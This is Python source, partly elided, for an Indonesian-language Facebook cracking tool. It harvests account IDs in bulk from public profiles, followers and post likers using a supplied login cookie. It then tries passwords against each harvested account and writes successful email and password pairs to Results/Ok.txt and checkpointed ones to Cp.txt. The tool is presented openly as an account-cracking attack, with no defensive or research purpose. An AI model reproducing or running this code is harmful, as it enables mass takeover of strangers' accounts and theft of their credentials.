...
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by krd-rstm
    Console(width=50, style="bold yellow").print(Panel("""[bold red]🤡:)[bold yellow] 🤡:)[bold green] 🤡:)


[bold blue]          ██╗  ██╗[bold red]██████╗ [bold yellow]██████╗
[bold blue]          ██║ ██╔╝[bold red]██╔══██╗[bold yellow]██╔══██╗
[bold blue]          █████╔╝ [bold red]██████╔╝[bold yellow]██║  ██║
[bold blue]          ██╔═██╗ [bold red]██╔══██╗[bold yellow]██║  ██║
[bold blue]          ██║  ██╗[bold red]██║  ██║[bold yellow]██████╔╝
[bold blue]          ╚═╝  ╚═╝[bold red]╚═╝  ╚═╝[bold yellow]╚═════╝
[bold blue]        \\|[bold blue] ACCOUNT[bold red] Facebook[bold yellow] INDONESIA [bold red]|/""", title="[bold red]>[bold yellow]>[bold green]>[bold blue] KRD-RSTM [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
...
def login_cookie():
    try:
        banner_logo()
        Console(width=50, style="bold yellow").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
[bold green]2[bold white]. isin dulu ke pericodenya 
[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold yellow]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=50, style="bold yellow").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            cookie = Console().input("[bold yellow]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                ...
                Console(width=50, style="bold yellow").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[bold blue] (AIM,COMING BRO) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
            ...
            try:
                Console().print("[bold yellow]   ╰─>[bold green] Kamu Akan diarahkan ke wa!", end='\r');time.sleep(3.6);os.system("https://wa.link/uexxbg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold yellow]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold yellow]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=50, style="bold yellow").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[bold yellow] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
...
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
    ...
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold blue]. Crack User Publik
[bold green]2[bold blue]. Crack  Dari Pengikut
[bold green]3[bold blue]. Crack  Dari Like Postingan
[bold green]3[bold blue]. Cek Akun
[bold green]4[bold blue]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
    query = Console().input("[bold yellow]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(width=50, style="bold yellow").print(Panel("[italic blue]Silahkan Masukan[italic blue] ID Akun Facebook[italic blue], Gunakan Koma Untuk Dump Massal, CONTOH👉 :[bold blue] 10001010101,1000", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold yellow]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold yellow]   ╰─>[bold yellow] Jumlah target Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=50, style="bold yellow").print(Panel(f"[bold white]Jumlah target :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold yellow").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
        try:
            Console(width=50, style="bold yellow").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, contoh :[italic green] 100011441,14511554", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold yellow]   ╰─> ")
            for z in userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            if len(Dump) < 50:
                Console().print("[bold yellow]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=50, style="bold yellow").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold yellow").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '3' or query == '03':
        try:
            Console(width=50, style="bold yellow").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            postid = Console().input("[bold yellow]   ╰─> ")
        ...
        Console().print("[bold yellow]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
### DUMP ###
class dump:
                ...
                for z in self.all_friends:
                    ...
                    if len(self.name) == 0 or len(self.name) > 100:
                        ...
                        if str(self.id_friends) in str(Dump):
                            ...
                            Console().print(f"[bold yellow]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Sorry, something went wrong.' in str(response):
                    Console().print(f"[bold yellow]   ╰─>[bold yellow] Sorry, Something Went Wrong!          ", end='\r');time.sleep(2.1)
                    return 0
                    ...
                    try:
                        ...
                        Console().print(f"[bold yellow]   ╰─>[bold red] processinggggg.......:)!             ", end='\r');time.sleep(2.1)
                        return 2
                else:
                    return 0
        except (KeyboardInterrupt):
            Console().print(f"[bold yellow]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ###
                    ...
                    for z in response['data']:
                        try:
                            ...
                            if str(self.id) in str(Dump):
                                ...
                                Console().print(f"[bold yellow]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold yellow]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold yellow]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold yellow]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
            ...
            for pws in password:
                ...
                with requests.Session() as r:
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        ...
                        tree = Tree("\r[bold white]LOGIN OKE BOSS_KRD-RSTM                      ", style = "bold white")
                        tree.add(f"[bold blue]Email : {email}").add(f"[bold blue]Password : {pws}", style = "bold white")
                       # tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
                        print(tree)
                        self.success.append(f'{email}|{pws}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold white]LOGIN CP ANJINHHH ZUCKBER                      ", style = "bold white")
                        ...
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack-KRD-RSTM {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
